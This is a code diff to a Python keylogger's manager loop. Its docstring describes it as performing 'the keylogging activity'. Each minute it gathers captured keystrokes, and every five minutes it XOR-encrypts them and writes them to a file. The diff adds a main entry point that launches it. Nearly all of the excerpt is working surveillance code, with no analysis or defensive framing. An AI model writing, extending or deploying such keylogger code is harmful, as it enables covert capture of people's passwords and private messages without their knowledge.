@@ -16,26 +16,33 @@ class Manager:
     def activity(self):
         """Perform the keylogging activity,
         writing data to a dictionary and file, and encrypting it periodically."""
-
-        w = FileWriter()
+        minute = 60
         dw = DictWriter()
+        fw = FileWriter()
         count = 0
         while True:
+            sleep(minute)
+            count += 1
             # Get the list of logged keys
             get_list = self.l.get_logged_keys()
+            print(get_list)
             # Write the list of characters to the dictionary writer
             dw.write(get_list)
             # Every 5 minutes, encrypt and write the dictionary to a file
             if count % 5 == 0:
                 # Get the dictionary from the dictionary writer
                 get_dict = dw.get_dict()
+                print(get_dict)
                 # Encrypt the dictionary
                 dict_encrypt = XorEncryptor().encrypt(get_dict)
+                print(dict_encrypt)
                 # Write the encrypted dictionary to the file
-                FileWriter().write(dict_encrypt)
+                fw.write(dict_encrypt)
                 if count >= 15:
                     DictWriter()
                     count = 0
             # Wait for a minute
-            sleep(60)
-            count += 1
+
+
+if __name__ == "__main__":
+    Manager().activity()
